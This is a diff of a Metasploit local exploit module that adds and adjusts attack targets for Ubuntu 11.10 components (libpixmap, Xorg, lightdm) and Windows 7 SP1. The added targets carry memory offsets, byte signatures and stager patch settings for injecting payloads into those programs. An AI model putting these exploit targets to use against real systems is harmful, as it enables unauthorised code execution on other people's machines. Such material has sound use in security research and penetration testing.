@@ -57,13 +57,37 @@ class Metasploit3 < Msf::Exploit::Local
                         'Arch' => ARCH_X86,
                         'Stages' => [ { 
                             'Offset' => 0x312,
-                            'Signature' =>"\x83\xf8\x10\x0f\x85\x50\x94\x00\x00\xb0\x01\x8b",
+                            'Signature' =>"\x55\x57\x56\x53\x83\xEC\x5C\x8B\x44\x24\x70\xE8\x47\xDC\xFA\xFF",
                             'Space' => 2048,
                             'Payload' => false,
                             'Patch' => winStager,
                             }, winStage2 ] }
                     ],
-					[ 'Ubuntu 11.10 lightdm', 
+					[ 'ubuntu 11.10 libpixmap', 
+                        { 
+                        'Arch' => ARCH_X86,
+                        'Platform' => 'linux',
+                        'Stages' => [ { 
+                            'Offset' => 0x480, 
+                            'Signature' =>"\x55\x57\x56\x53\x83\xEC\x5C\x8B",
+                            'Patch' => linuxStager,
+                            'Space' => 2048,
+                            'Payload'=> false,
+                            }, linuxStage2 ] }
+                    ],
+					[ 'ubuntu 11.10 Xorg', 
+                        { 
+                        'Arch' => ARCH_X86,
+                        'Platform' => 'linux',
+                        'Stages' => [ { 
+                            'Offset' => 0xFA7, 
+                            'Signature'=>"\x0F\x8E\xC8\x02\x00\x00\x8B\x8B\x08\xFF\xFF\xFF\x8B\x41\x04\x8B",
+                            'Patch' => linuxStager,
+                            'Space' => 2048,
+                            'Payload'=> false,
+                            }, linuxStage2 ] }
+                    ],
+					[ 'ubuntu 11.10 lightdm', 
                         { 
                         'Arch' => ARCH_X86,
                         'Platform' => 'linux',
@@ -82,6 +106,18 @@ class Metasploit3 < Msf::Exploit::Local
                         'Stages' => [ { 
                             'Offset' => 0x590, 
                             'Signature' => "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24",
+                            'Space' => 2048,
+                            'Payload'=> true,
+                            'Patch' => "",
+                            }] }
+                    ],
+					[ 'Windows 7 x86 sp1 DIRECT', 
+                        { 
+                        'Arch' => ARCH_X86,
+                        'Platform' => 'windows',
+                        'Stages' => [ { 
+                            'Offset' => 0x312, 
+                            'Signature' =>"\x83\xf8\x10\x0f\x85\x50\x94\x00\x00\xb0\x01\x8b",
                             'Space' => 2048,
                             'Payload'=> true,
                             'Patch' => "",
